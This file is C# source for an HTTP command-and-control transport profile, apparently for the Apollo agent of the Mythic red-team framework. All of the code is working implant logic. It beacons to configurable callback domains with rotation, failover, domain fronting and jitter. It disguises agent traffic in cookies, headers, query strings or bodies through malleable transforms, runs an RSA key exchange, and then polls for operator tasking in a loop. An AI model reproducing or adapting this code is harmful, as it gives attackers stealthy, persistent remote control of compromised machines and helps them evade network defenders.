using System;
using System.Collections.Generic;
using System.Linq;
using ApolloInterop.Classes;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;
using ApolloInterop.Types.Delegates;
using System.Net;
using ApolloInterop.Enums.ApolloEnums;
using HttpxTransform;
using System.Text;
using System.IO;
using System.Threading;

#if DEBUG
using System.Diagnostics;
#endif

// Add HttpWebResponse for detailed error logging

namespace HttpxTransport
{
    /// <summary>
    /// HttpxProfile implementation for Apollo agent
    /// Supports malleable profiles with message transforms
    /// </summary>
    public class HttpxProfile : C2Profile, IC2Profile
    {
        private int CallbackInterval;
        private double CallbackJitter;
        private string[] CallbackDomains;
        private string DomainRotation;
        private int FailoverThreshold;
        private bool EncryptedExchangeCheck;
        private string KillDate;
        private HttpxConfig Config;
        private int CurrentDomainIndex = 0;
        private int FailureCount = 0;
        private Random Random = new Random();
        private bool _uuidNegotiated = false;
        private RSAKeyGenerator rsa = null;
        private string _tempUUID = null; // For EKE staging process
        
        // Add thread-safe properties for runtime sleep/jitter changes
        private volatile int _currentSleepInterval;
        private volatile int _currentJitterInt; // Store as int to avoid volatile double issue
        
        // Add missing features
        private string ProxyHost;
        private int ProxyPort;
        private string ProxyUser;
        private string ProxyPass;
        private string DomainFront;
        private int TimeoutSeconds = 240;

        public HttpxProfile(Dictionary<string, string> data, ISerializer serializer, IAgent agent) : base(data, serializer, agent)
        {
#if DEBUG
            DebugWriteLine("[HttpxProfile] Constructor starting");
            DebugWriteLine($"[HttpxProfile] Received {data.Count} parameters");
#endif
            
            // Parse basic parameters
            CallbackInterval = GetIntValueOrDefault(data, "callback_interval", 10);
#if DEBUG
            DebugWriteLine($"[HttpxProfile] callback_interval = {CallbackInterval}");
#endif
            
            CallbackJitter = GetDoubleValueOrDefault(data, "callback_jitter", 23.0);
#if DEBUG
            DebugWriteLine($"[HttpxProfile] callback_jitter = {CallbackJitter}");
#endif
            
            CallbackDomains = GetValueOrDefault(data, "callback_domains", "https://example.com:443").Split(',');
#if DEBUG
            DebugWriteLine($"[HttpxProfile] callback_domains = [{string.Join(", ", CallbackDomains)}]");
#endif
            
            DomainRotation = GetValueOrDefault(data, "domain_rotation", "fail-over");
#if DEBUG
            DebugWriteLine($"[HttpxProfile] domain_rotation = {DomainRotation}");
#endif
            
            FailoverThreshold = GetIntValueOrDefault(data, "failover_threshold", 5);
#if DEBUG
            DebugWriteLine($"[HttpxProfile] failover_threshold = {FailoverThreshold}");
#endif
            
            EncryptedExchangeCheck = GetBoolValueOrDefault(data, "encrypted_exchange_check", true);
#if DEBUG
            DebugWriteLine($"[HttpxProfile] encrypted_exchange_check = {EncryptedExchangeCheck}");
#endif
            
            KillDate = GetValueOrDefault(data, "killdate", "-1");
#if DEBUG
            DebugWriteLine($"[HttpxProfile] killdate = {KillDate}");
#endif
            
            // Parse additional features
            ProxyHost = GetValueOrDefault(data, "proxy_host", "");
#if DEBUG
            DebugWriteLine($"[HttpxProfile] proxy_host = '{ProxyHost}'");
#endif
            
            ProxyPort = GetIntValueOrDefault(data, "proxy_port", 0);
#if DEBUG
            DebugWriteLine($"[HttpxProfile] proxy_port = {ProxyPort}");
#endif
            
            ProxyUser = GetValueOrDefault(data, "proxy_user", "");
            ProxyPass = GetValueOrDefault(data, "proxy_pass", "");
            DomainFront = GetValueOrDefault(data, "domain_front", "");
            TimeoutSeconds = GetIntValueOrDefault(data, "timeout", 240);
#if DEBUG
            DebugWriteLine($"[HttpxProfile] timeout = {TimeoutSeconds}");
#endif
            
            // Initialize runtime-changeable values
            _currentSleepInterval = CallbackInterval;
            _currentJitterInt = (int)(CallbackJitter * 100); // Store as int (multiply by 100)
#if DEBUG
            DebugWriteLine($"[HttpxProfile] Initialized runtime values: sleep={_currentSleepInterval}, jitter={_currentJitterInt}");
#endif

            // Load httpx configuration
            string rawConfig = GetValueOrDefault(data, "raw_c2_config", "");
#if DEBUG
            DebugWriteLine($"[HttpxProfile] raw_c2_config length = {rawConfig.Length}");
#endif
            
            LoadHttpxConfig(rawConfig);
#if DEBUG
            DebugWriteLine("[HttpxProfile] Constructor complete");
#endif
        }

        private string GetValueOrDefault(Dictionary<string, string> dictionary, string key, string defaultValue)
        {
            string value;
            if (dictionary.TryGetValue(key, out value))
            {
                // Return empty string as default if value is null or empty
                if (string.IsNullOrEmpty(value))
                {
                    return defaultValue;
                }
                return value;
            }
            return defaultValue;
        }

        private int GetIntValueOrDefault(Dictionary<string, string> dictionary, string key, int defaultValue)
        {
            string value;
            if (dictionary.TryGetValue(key, out value))
            {
                if (string.IsNullOrEmpty(value))
                {
                    return defaultValue;
                }
                if (int.TryParse(value, out int result))
                {
                    return result;
                }
            }
            return defaultValue;
        }

        private double GetDoubleValueOrDefault(Dictionary<string, string> dictionary, string key, double defaultValue)
        {
            string value;
            if (dictionary.TryGetValue(key, out value))
            {
                if (string.IsNullOrEmpty(value))
                {
                    return defaultValue;
                }
                if (double.TryParse(value, out double result))
                {
                    return result;
                }
            }
            return defaultValue;
        }

        private bool GetBoolValueOrDefault(Dictionary<string, string> dictionary, string key, bool defaultValue)
        {
            string value;
            if (dictionary.TryGetValue(key, out value))
            {
                if (string.IsNullOrEmpty(value))
                {
                    return defaultValue;
                }
                if (bool.TryParse(value, out bool result))
                {
                    return result;
                }
            }
            return defaultValue;
        }

#if DEBUG
        private void DebugWriteLine(string message)
        {
            Console.WriteLine(message);
            Debug.WriteLine(message);
        }
#endif

        private static readonly HashSet<string> RestrictedHeaders = new HashSet<string>(StringComparer.OrdinalIgnoreCase)
        {
            "Connection",
            "Content-Length",
            "Date",
            "Expect",
            "Host",
            "If-Modified-Since",
            "Range",
            "Referer",
            "Transfer-Encoding",
            "User-Agent"
        };

        private bool IsRestrictedHeader(string headerName)
        {
            return RestrictedHeaders.Contains(headerName);
        }

        /// <summary>
        /// Check if a string contains invalid characters for HTTP headers
        /// HTTP headers should only contain printable ASCII (0x20-0x7E) and no CR/LF
        /// </summary>
        private bool ContainsInvalidHeaderChars(string value)
        {
            if (string.IsNullOrEmpty(value)) return false;
            
            foreach (char c in value)
            {
                // Check for non-printable ASCII or CR/LF
                if (c < 0x20 || c > 0x7E || c == '\r' || c == '\n')
                {
                    return true;
                }
            }
            return false;
        }

        private void LoadHttpxConfig(string configData)
        {
#if DEBUG
            DebugWriteLine("[LoadHttpxConfig] Starting");
            DebugWriteLine($"[LoadHttpxConfig] configData is null = {configData == null}, length = {configData?.Length ?? 0}");
#endif
            
            try
            {
                if (!string.IsNullOrEmpty(configData))
                {
#if DEBUG
                    DebugWriteLine("[LoadHttpxConfig] Config data provided, attempting to decode");
#endif
                    
                    // Check if config is Base64 encoded (new format to avoid string escaping issues)
                    string decodedConfig = configData;
                    try
                    {
                        byte[] data = Convert.FromBase64String(configData);
                        decodedConfig = System.Text.Encoding.UTF8.GetString(data);
#if DEBUG
                        DebugWriteLine("[LoadHttpxConfig] Successfully decoded Base64 config");
                        DebugWriteLine($"[LoadHttpxConfig] Decoded config length = {decodedConfig.Length}");
#endif
                    }
                    catch (FormatException ex)
                    {
#if DEBUG
                        DebugWriteLine($"[LoadHttpxConfig] Not Base64 encoded (using as-is): {ex.Message}");
#endif
                        // Not Base64, use as-is (backward compatibility)
                    }
                    
                    // Load from provided config data
#if DEBUG
                    DebugWriteLine("[LoadHttpxConfig] Attempting HttpxConfig.FromJson");
#endif
                    Config = HttpxConfig.FromJson(decodedConfig);
#if DEBUG
                    DebugWriteLine($"[LoadHttpxConfig] Successfully loaded config: {Config.Name}");
#endif
                }
                else
                {
#if DEBUG
                    DebugWriteLine("[LoadHttpxConfig] No config data provided - agent cannot function without C2 config");
#endif
                    throw new InvalidOperationException("Httpx C2 profile requires configuration data. Please provide the raw_c2_config parameter with a valid configuration.");
                }
                
#if DEBUG
                DebugWriteLine("[LoadHttpxConfig] Validating config");
#endif
                Config.Validate();
#if DEBUG
                DebugWriteLine("[LoadHttpxConfig] Config validated successfully");
#endif
            }
            catch (Exception ex)
            {
#if DEBUG
                DebugWriteLine($"[LoadHttpxConfig] ERROR: {ex.GetType().Name}: {ex.Message}");
                DebugWriteLine($"[LoadHttpxConfig] Stack: {ex.StackTrace}");
                DebugWriteLine("[LoadHttpxConfig] Killing agent");
#endif
                Environment.Exit(1);
            }
        }

        private string GetCurrentDomain()
        {
            if (CallbackDomains == null || CallbackDomains.Length == 0)
            {
#if DEBUG
                DebugWriteLine("[GetCurrentDomain] No callback domains, killing agent");
#endif
                Environment.Exit(1);
            }
               

            switch (DomainRotation.ToLower())
            {
                case "round-robin":
                    CurrentDomainIndex = (CurrentDomainIndex + 1) % CallbackDomains.Length;
                    return CallbackDomains[CurrentDomainIndex];

                case "random":
                    return CallbackDomains[Random.Next(CallbackDomains.Length)];

                case "fail-over":
                default:
                    return CallbackDomains[CurrentDomainIndex];
            }
        }

        private void HandleDomainFailure()
        {
            FailureCount++;
            if (FailureCount >= FailoverThreshold)
            {
                CurrentDomainIndex = (CurrentDomainIndex + 1) % CallbackDomains.Length;
                FailureCount = 0;
            }
        }

        private void HandleDomainSuccess()
        {
            FailureCount = 0;
        }

        public bool SendRecv<T, TResult>(T message, OnResponse<TResult> onResponse)
        {
            string sMsg = Serializer.Serialize(message);
            byte[] messageBytes = Encoding.UTF8.GetBytes(sMsg);

            // Select HTTP method variation based on message size
            // Default behavior: use POST for large messages (>500 bytes), GET for small messages
            // Only supports GET and POST methods
            VariationConfig variation = null;
#if DEBUG
            DebugWriteLine($"[SendRecv] Message size: {messageBytes.Length} bytes");
#endif
            if (messageBytes.Length > 500)
            {
#if DEBUG
                DebugWriteLine("[SendRecv] Large message (>500 bytes), selecting POST variation");
#endif
                // Try POST for large messages
                variation = Config.GetConfiguredVariation("post");
                
                // Fall back to GET if POST is not configured
                if (variation == null)
                {
#if DEBUG
                    DebugWriteLine("[SendRecv] No POST configured, falling back to GET");
#endif
                    variation = Config.GetConfiguredVariation("get");
                }
            }
            else
            {
#if DEBUG
                DebugWriteLine("[SendRecv] Small message (<=500 bytes), selecting GET variation");
#endif
                // Small messages: use GET
                variation = Config.GetConfiguredVariation("get");
                
                // Fall back to POST if GET is not configured
                if (variation == null)
                {
#if DEBUG
                    DebugWriteLine("[SendRecv] No GET configured, falling back to POST");
#endif
                    variation = Config.GetConfiguredVariation("post");
                }
            }
            
            // Final fallback to ensure we have a valid variation
            if (variation == null)
            {
                throw new InvalidOperationException("No valid HTTP method variation found in configuration. Please ensure your Httpx config defines at least GET or POST methods.");
            }

#if DEBUG
            DebugWriteLine($"[SendRecv] Selected variation: {variation.Verb}");
            DebugWriteLine($"[SendRecv] Available URIs: [{string.Join(", ", variation.Uris)}]");
            DebugWriteLine($"[SendRecv] Message location: {variation.Client?.Message?.Location ?? "none"}");
            DebugWriteLine($"[SendRecv] Message name: {variation.Client?.Message?.Name ?? "none"}");
#endif

            // Apply client transforms
            byte[] transformedData = TransformChain.ApplyClientTransforms(messageBytes, variation.Client.Transforms);

            string url = null; // Declare outside try block for error logging
            try
            {
                string domain = GetCurrentDomain();
                string uri = variation.Uris[Random.Next(variation.Uris.Count)];
                url = domain + uri;
#if DEBUG
                DebugWriteLine($"[SendRecv] Domain: {domain}");
                DebugWriteLine($"[SendRecv] Selected URI: {uri}");
                DebugWriteLine($"[SendRecv] Initial URL: {url}");
#endif

                // Handle message placement and build final URL with query parameters if needed
                byte[] requestBodyBytes = null;
                string contentType = null;
                
                switch (variation.Client.Message.Location.ToLower())
                {
                    case "query":
                        string queryParam = "";
                        // Add custom query parameters first
                        if (variation.Client.Parameters != null)
                        {
                            foreach (var param in variation.Client.Parameters)
                            {
                                if (!string.IsNullOrEmpty(queryParam))
                                    queryParam += "&";
                                queryParam += $"{param.Key}={Uri.EscapeDataString(param.Value)}";
                            }
                        }
                        // Add message parameter
                        string transformedString = Encoding.UTF8.GetString(transformedData);
                        
                        // Check if the transformed data already contains a query parameter pattern (e.g., "filter=" from prepend transform)
                        // If it does and matches the message name, use it directly to avoid duplication
                        string paramPrefix = variation.Client.Message.Name + "=";
                        if (transformedString.StartsWith(paramPrefix))
                        {
                            // Transformed data already includes parameter name (from prepend transform), use as-is
                            if (!string.IsNullOrEmpty(queryParam))
                                queryParam += "&";
                            queryParam += transformedString;
                        }
                        else
                        {
                            // Standard case: add parameter name
                            // NOTE: transformedData is already URL-safe (base64url/netbios/netbiosu)
                            // Do NOT apply Uri.EscapeDataString to avoid double-encoding
                            if (!string.IsNullOrEmpty(queryParam))
                                queryParam += "&";
                            queryParam += $"{variation.Client.Message.Name}={transformedString}";
                        }
                        url = url.Split('?')[0] + "?" + queryParam;
#if DEBUG
                        DebugWriteLine($"[SendRecv] Final URL with query params: {url}");
                        DebugWriteLine($"[SendRecv] Query param length: {queryParam.Length} chars");
#endif
                        break;

                    case "cookie":
                    case "header":
                    case "body":
                    default:
                        requestBodyBytes = variation.Client.Message.Location.ToLower() == "body" ? transformedData : null;
#if DEBUG
                        if (variation.Client.Message.Location.ToLower() == "cookie")
                        {
                            DebugWriteLine($"[SendRecv] Message will be placed in cookie: {variation.Client.Message.Name}");
                        }
                        else if (variation.Client.Message.Location.ToLower() == "header")
                        {
                            DebugWriteLine($"[SendRecv] Message will be placed in header: {variation.Client.Message.Name}");
                        }
                        else if (variation.Client.Message.Location.ToLower() == "body")
                        {
                            DebugWriteLine($"[SendRecv] Message will be placed in body ({transformedData.Length} bytes)");
                        }
#endif
                        break;
                }

                // Create HttpWebRequest for full control over headers
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                request.Method = variation.Verb;
#if DEBUG
                DebugWriteLine($"[SendRecv] HTTP Method: {variation.Verb}");
                DebugWriteLine($"[SendRecv] Final URL: {url}");
#endif
                request.Timeout = TimeoutSeconds * 1000;
                request.ReadWriteTimeout = TimeoutSeconds * 1000;
                
                // Configure proxy if needed
                if (!string.IsNullOrEmpty(ProxyHost) && ProxyPort > 0)
                {
                    request.Proxy = new WebProxy($"{ProxyHost}:{ProxyPort}");
                    
                    if (!string.IsNullOrEmpty(ProxyUser) && !string.IsNullOrEmpty(ProxyPass))
                    {
                        request.Proxy.Credentials = new NetworkCredential(ProxyUser, ProxyPass);
                    }
                }
                else
                {
                    request.Proxy = WebRequest.GetSystemWebProxy();
                    request.Proxy.Credentials = CredentialCache.DefaultCredentials;
                }
                
                // Add all headers (including restricted ones)
                foreach (var header in variation.Client.Headers)
                {
                    
                    bool headerSet = false;
                    
                    // Try setting via properties first (for restricted headers)
                    switch (header.Key.ToLower())
                    {
                        case "accept":
                            request.Accept = header.Value;
                            headerSet = true;
                            break;
                        case "connection":
                            // Set KeepAlive property based on Connection header
                            if (header.Value.ToLower().Contains("keep-alive") || header.Value.ToLower() == "keepalive")
                            {
                                request.KeepAlive = true;
                                headerSet = true;
                            }
                            else if (header.Value.ToLower() == "close")
                            {
                                request.KeepAlive = false;
                                headerSet = true;
                            }
                            // Note: We can't add Connection header directly in .NET HttpWebRequest
                            // But setting KeepAlive = true should achieve the same effect
                            break;
                        case "content-type":
                            request.ContentType = header.Value;
                            headerSet = true;
                            break;
                        case "content-length":
                            // Set via ContentLength property when writing body
                            headerSet = true;
                            break;
                        case "expect":
                            // HttpWebRequest doesn't support setting Expect header directly
                            // Skip it or log a warning
                            headerSet = true; // Mark as handled so we don't try to add it
                            break;
                        case "host":
                            request.Host = header.Value;
                            headerSet = true;
                            break;
                        case "if-modified-since":
                            if (DateTime.TryParse(header.Value, out DateTime modifiedDate))
                            {
                                request.IfModifiedSince = modifiedDate;
                                headerSet = true;
                            }
                            break;
                        case "range":
                            // Range header is complex, skip for now
                            headerSet = true;
                            break;
                        case "referer":
                            request.Referer = header.Value;
                            headerSet = true;
                            break;
                        case "transfer-encoding":
                            // Transfer-Encoding is not directly settable in HttpWebRequest
                            headerSet = true;
                            break;
                        case "user-agent":
                            request.UserAgent = header.Value;
                            headerSet = true;
                            break;
                    }
                    
                    // If header wasn't set via property, try adding it to Headers collection
                    if (!headerSet)
                    {
                        try
                        {
                            request.Headers[header.Key] = header.Value;
                            headerSet = true;
                        }
                        catch (Exception ex)
                        {
#if DEBUG
                            DebugWriteLine($"[SendRecv] WARNING: Could not set header '{header.Key}': {ex.Message}");
#endif
                        }
                    }
                }
                
                // Handle cookie and header placement (must be after request is created)
                switch (variation.Client.Message.Location.ToLower())
                {
                    case "cookie":
                        // Convert transformed data to string for cookie value
                        // For netbios/netbiosu, the data is already ASCII-printable letters
                        // URL encoding is needed for cookies to handle any special characters
                        string cookieValue = Encoding.UTF8.GetString(transformedData);
                        string cookieHeader = $"{variation.Client.Message.Name}={Uri.EscapeDataString(cookieValue)}";
                        request.Headers[HttpRequestHeader.Cookie] = cookieHeader;
#if DEBUG
                        DebugWriteLine($"[SendRecv] Cookie header set: {variation.Client.Message.Name} (value length: {cookieValue.Length} chars)");
#endif
                        break;

                    case "header":
                        // Convert transformed data to string for header value
                        // Headers can contain ASCII characters; netbios produces lowercase letters (a-p), netbiosu produces uppercase (A-P)
                        // These are safe for HTTP headers, but we should validate they're valid header characters
                        string headerValue = Encoding.UTF8.GetString(transformedData);
                        
                        // HTTP headers should only contain printable ASCII characters (0x20-0x7E) and not contain CR/LF
                        // If the transformed data contains non-printable characters, we might need base64 encoding
                        // For now, use as-is since netbios/netbiosu produce printable ASCII
                        if (ContainsInvalidHeaderChars(headerValue))
                        {
                            // If header contains invalid characters, base64 encode it
                            headerValue = Convert.ToBase64String(transformedData);
                        }
                        request.Headers[variation.Client.Message.Name] = headerValue;
#if DEBUG
                        DebugWriteLine($"[SendRecv] Custom header set: {variation.Client.Message.Name} (value length: {headerValue.Length} chars)");
#endif
                        break;
                }

                // Write request body for POST
                if (requestBodyBytes != null && requestBodyBytes.Length > 0)
                {
#if DEBUG
                    DebugWriteLine($"[SendRecv] Writing request body ({requestBodyBytes.Length} bytes)");
#endif
                    request.ContentLength = requestBodyBytes.Length;
                    using (var requestStream = request.GetRequestStream())
                    {
                        requestStream.Write(requestBodyBytes, 0, requestBodyBytes.Length);
                    }
                }

                // Get response
                string response;
                HttpWebResponse httpResponse = null;
#if DEBUG
                DebugWriteLine($"[SendRecv] Sending {variation.Verb} request to: {url}");
                DebugWriteLine($"[SendRecv] Request headers count: {request.Headers.Count}");
                DebugWriteLine($"[SendRecv] Request headers:");
                foreach (string headerName in request.Headers.AllKeys)
                {
                    DebugWriteLine($"[SendRecv]   {headerName}: {request.Headers[headerName]}");
                }
                // Also log property-based headers
                if (!string.IsNullOrEmpty(request.Accept))
                    DebugWriteLine($"[SendRecv]   Accept (property): {request.Accept}");
                if (!string.IsNullOrEmpty(request.UserAgent))
                    DebugWriteLine($"[SendRecv]   User-Agent (property): {request.UserAgent}");
                if (!string.IsNullOrEmpty(request.Referer))
                    DebugWriteLine($"[SendRecv]   Referer (property): {request.Referer}");
                if (requestBodyBytes != null && requestBodyBytes.Length > 0)
                {
                    DebugWriteLine($"[SendRecv] Request body size: {requestBodyBytes.Length} bytes");
                }
#endif
                try
                {
                    httpResponse = (HttpWebResponse)request.GetResponse();
#if DEBUG
                    DebugWriteLine($"[SendRecv] Response received: {httpResponse.StatusCode} {httpResponse.StatusDescription}");
#endif
                    using (Stream responseStream = httpResponse.GetResponseStream())
                    {
                        using (StreamReader reader = new StreamReader(responseStream))
                        {
                            response = reader.ReadToEnd();
                        }
                    }
                }
                finally
                {
                    httpResponse?.Close();
                }

                HandleDomainSuccess();

                // Extract response data based on server configuration
                byte[] responseBytes = ExtractResponseData(response, httpResponse, variation.Server);
                
                // Apply server transforms (reverse)
                byte[] untransformedData = TransformChain.ApplyServerTransforms(responseBytes, variation.Server.Transforms);
                
                string responseString = Encoding.UTF8.GetString(untransformedData);
                
#if DEBUG
                try
                {
                    var result = Serializer.Deserialize<TResult>(responseString);
                    onResponse(result);
                }
                catch (Exception deserEx)
                {
                    DebugWriteLine($"[SendRecv] Deserialization failed: {deserEx.GetType().Name}: {deserEx.Message}");
                    throw;
                }
#else
                onResponse(Serializer.Deserialize<TResult>(responseString));
#endif
                
                return true;
            }
            catch (Exception ex)
            {
#if DEBUG
                DebugWriteLine($"[SendRecv] ERROR: {ex.GetType().Name}: {ex.Message}");
                DebugWriteLine($"[SendRecv] Stack: {ex.StackTrace}");
                
                // Log inner exception details if present
                if (ex.InnerException != null)
                {
                    DebugWriteLine($"[SendRecv] INNER EXCEPTION: {ex.InnerException.GetType().Name}: {ex.InnerException.Message}");
                    DebugWriteLine($"[SendRecv] INNER STACK: {ex.InnerException.StackTrace}");
                }
                
                // Log WebException details
                if (ex is WebException webEx)
                {
                    DebugWriteLine($"[SendRecv] WebException Status: {webEx.Status}");
                    DebugWriteLine($"[SendRecv] WebException Response: {webEx.Response}");
                    
                    if (webEx.Response is HttpWebResponse httpResponse)
                    {
                        DebugWriteLine($"[SendRecv] HTTP Status Code: {httpResponse.StatusCode}");
                        DebugWriteLine($"[SendRecv] HTTP Status Description: {httpResponse.StatusDescription}");
                        DebugWriteLine($"[SendRecv] Response Headers:");
                        foreach (string headerName in httpResponse.Headers.AllKeys)
                        {
                            DebugWriteLine($"[SendRecv]   {headerName}: {httpResponse.Headers[headerName]}");
                        }
                        
                        // Try to read response body for additional context
                        try
                        {
                            using (Stream responseStream = httpResponse.GetResponseStream())
                            {
                                if (responseStream != null)
                                {
                                    using (StreamReader reader = new StreamReader(responseStream))
                                    {
                                        string responseBody = reader.ReadToEnd();
                                        DebugWriteLine($"[SendRecv] Response body length: {responseBody.Length} chars");
                                        if (responseBody.Length > 0 && responseBody.Length < 500)
                                        {
                                            DebugWriteLine($"[SendRecv] Response body: {responseBody}");
                                        }
                                        else if (responseBody.Length > 0)
                                        {
                                            DebugWriteLine($"[SendRecv] Response body (first 500 chars): {responseBody.Substring(0, Math.Min(500, responseBody.Length))}");
                                        }
                                    }
                                }
                            }
                        }
                        catch (Exception readEx)
                        {
                            DebugWriteLine($"[SendRecv] Could not read response body: {readEx.Message}");
                        }
                    }
                    
                    // Log request details that failed
                    DebugWriteLine($"[SendRecv] Failed request details:");
                    DebugWriteLine($"[SendRecv]   Method: {variation?.Verb ?? "unknown"}");
                    DebugWriteLine($"[SendRecv]   URL: {url ?? "unknown"}");
                    DebugWriteLine($"[SendRecv]   Message location: {variation?.Client?.Message?.Location ?? "none"}");
                    DebugWriteLine($"[SendRecv]   Message name: {variation?.Client?.Message?.Name ?? "none"}");
                    DebugWriteLine($"[SendRecv]   Transformed data length: {transformedData?.Length ?? 0} bytes");
                }
#endif
                HandleDomainFailure();
                return false;
            }
        }

        private byte[] ExtractResponseData(string response, HttpWebResponse httpResponse, ServerConfig serverConfig)
        {
            // Check if server transforms include prepend/append that wrap encoded data
            // This helps extract the actual payload from JSON/HTML wrappers
            if (serverConfig?.Transforms != null && serverConfig.Transforms.Count > 0)
            {
                // Find prepend and append transforms
                string prependValue = null;
                string appendValue = null;
                bool hasEncodingTransforms = false;
                
                foreach (var transform in serverConfig.Transforms)
                {
                    if (transform.Action?.ToLower() == "prepend" && !string.IsNullOrEmpty(transform.Value))
                    {
                        prependValue = transform.Value;
                    }
                    else if (transform.Action?.ToLower() == "append" && !string.IsNullOrEmpty(transform.Value))
                    {
                        appendValue = transform.Value;
                    }
                    else if (transform.Action?.ToLower() == "base64" || 
                             transform.Action?.ToLower() == "base64url" ||
                             transform.Action?.ToLower() == "netbios" ||
                             transform.Action?.ToLower() == "netbiosu")
                    {
                        hasEncodingTransforms = true;
                    }
                }
                
                // If we have prepend/append wrapping encoded data, try to extract the inner portion
                if (prependValue != null || appendValue != null)
                {
                    // For JSON/HTML wrappers, we need to extract the encoded portion
                    // The encoded data is typically between the prepend and append values
                    string extractedData = response;
                    
                    // Try to find and extract the encoded portion
                    if (prependValue != null && extractedData.StartsWith(prependValue))
                    {
                        extractedData = extractedData.Substring(prependValue.Length);
                    }
                    
                    if (appendValue != null && extractedData.EndsWith(appendValue))
                    {
                        extractedData = extractedData.Substring(0, extractedData.Length - appendValue.Length);
                    }
                    
                    // If we successfully extracted something different, use it
                    // Otherwise fall back to full response (might be a different pattern)
                    if (extractedData != response && extractedData.Length > 0)
                    {
                        return Encoding.UTF8.GetBytes(extractedData);
                    }
                }
            }
            
            // Default: return entire response body as bytes
            // This works when transforms don't wrap the data, or when extraction above didn't work
            return Encoding.UTF8.GetBytes(response);
        }

        public bool Connect()
        {
            return true;
        }

        public bool IsConnected()
        {
            return Connected;
        }

        public bool Connect(CheckinMessage checkinMsg, OnResponse<MessageResponse> onResp)
        {
            // Httpx profile uses EKE (Encrypted Key Exchange) as per Mythic documentation
            // https://docs.mythic-c2.net/customizing/payload-type-development/create_tasking/agent-side-coding/initial-checkin
            
            if (EncryptedExchangeCheck && !_uuidNegotiated)
            {
#if DEBUG
                DebugWriteLine("[Connect] EKE: Starting RSA handshake (4096-bit)");
#endif
                
                // Generate RSA keypair - 4096 bit as per Mythic spec
                rsa = Agent.GetApi().NewRSAKeyPair(4096);
                
                // Create EKE handshake message with RSA public key
                EKEHandshakeMessage handshake1 = new EKEHandshakeMessage()
                {
                    Action = "staging_rsa",
                    PublicKey = rsa.ExportPublicKey(),
                    SessionID = rsa.SessionId
                };

                // Send handshake with current serializer (uses payloadUUID + embedded AES key)
                if (!SendRecv<EKEHandshakeMessage, EKEHandshakeResponse>(handshake1, delegate(EKEHandshakeResponse respHandshake)
                {
                    // Decrypt the session key using our RSA private key
                    byte[] tmpKey = rsa.RSA.Decrypt(Convert.FromBase64String(respHandshake.SessionKey), true);
                    
                    // Update serializer with new session key and tempUUID
                    ((ICryptographySerializer)Serializer).UpdateKey(Convert.ToBase64String(tmpKey));
                    ((ICryptographySerializer)Serializer).UpdateUUID(respHandshake.UUID);
                    Agent.SetUUID(respHandshake.UUID);
                    
#if DEBUG
                    DebugWriteLine($"[Connect] EKE: Handshake complete, tempUUID: {respHandshake.UUID}, session key received");
#endif
                    return true;
                }))
                {
#if DEBUG
                    DebugWriteLine("[Connect] EKE: Handshake failed");
#endif
                    return false;
                }
                
                // DON'T set _uuidNegotiated = true here!
                // We need to wait for the checkin response to get the final callbackUUID
            }

            // Send checkin message (after EKE handshake if applicable)
            return SendRecv<CheckinMessage, MessageResponse>(checkinMsg, delegate (MessageResponse mResp)
            {
                Connected = true;
                
                // Always update to the final callbackUUID from checkin response
                // This happens whether we did EKE (tempUUID → callbackUUID) or not (payloadUUID → callbackUUID)
                ((ICryptographySerializer)Serializer).UpdateUUID(mResp.ID);
                Agent.SetUUID(mResp.ID);
                _uuidNegotiated = true;
                
#if DEBUG
                DebugWriteLine($"[Connect] Checkin complete, callbackUUID: {mResp.ID}");
#endif
                return onResp(mResp);
            });
        }

        public int GetSleepTime()
        {
            // Use runtime-changeable values instead of static ones
            int sleepInterval = _currentSleepInterval;
            double jitter = _currentJitterInt / 100.0; // Convert back to double
            
            if (jitter > 0)
            {
                double jitterAmount = sleepInterval * (jitter / 100.0);
                double jitterVariation = (Random.NextDouble() - 0.5) * 2 * jitterAmount;
                return (int)(sleepInterval + jitterVariation);
            }
            return sleepInterval;
        }
        
        /// <summary>
        /// Update sleep interval and jitter at runtime (called by sleep command)
        /// </summary>
        public void UpdateSleepSettings(int interval, double jitter)
        {
            if (interval >= 0)
            {
                _currentSleepInterval = interval;
            }
            if (jitter >= 0)
            {
                _currentJitterInt = (int)(jitter * 100); // Store as int
            }
        }

        public void SetConnected(bool connected)
        {
            Connected = connected;
        }

        // IC2Profile interface implementations
        public void Start()
        {
#if DEBUG
            DebugWriteLine("[Start] HttpxProfile.Start() called - beginning main loop");
#endif
            
            // Set the agent's sleep interval and jitter from profile settings
            Agent.SetSleep(CallbackInterval, CallbackJitter);
            
            bool first = true;
            while(Agent.IsAlive())
            {
#if DEBUG
                if (first)
                {
                    DebugWriteLine("[Start] First iteration - attempting initial checkin");
                    first = false;
                }
                DebugWriteLine("[Start] Beginning GetTasking call");
#endif
                
                bool bRet = GetTasking(resp =>
                {
#if DEBUG
                    DebugWriteLine($"[Start] GetTasking callback received response");
                    DebugWriteLine($"[Start] Processing message response via TaskManager");
#endif
                    return Agent.GetTaskManager().ProcessMessageResponse(resp);
                });

#if DEBUG
                DebugWriteLine($"[Start] GetTasking returned: {bRet}");
#endif

                if (!bRet)
                {
#if DEBUG
                    DebugWriteLine("[Start] GetTasking returned false, breaking loop");
#endif
                    break;
                }

#if DEBUG
                DebugWriteLine("[Start] Calling Agent.Sleep()");
#endif
                Agent.Sleep();
            }
            
#if DEBUG
            DebugWriteLine("[Start] Main loop ended");
#endif
        }

        // NOTE: GetTasking sends a TaskingMessage to Mythic and processes the response via ProcessMessageResponse.

        private bool GetTasking(OnResponse<MessageResponse> onResp) => Agent.GetTaskManager().CreateTaskingMessage(msg => SendRecv(msg, onResp));
        
        public bool IsOneWay() => false;

        public bool Send<IMythicMessage>(IMythicMessage message) => throw new Exception("HttpxProfile does not support Send only.");
        
        public bool Recv(MessageType mt, OnResponse<IMythicMessage> onResp) => throw new NotImplementedException("HttpxProfile does not support Recv only.");
    }
}
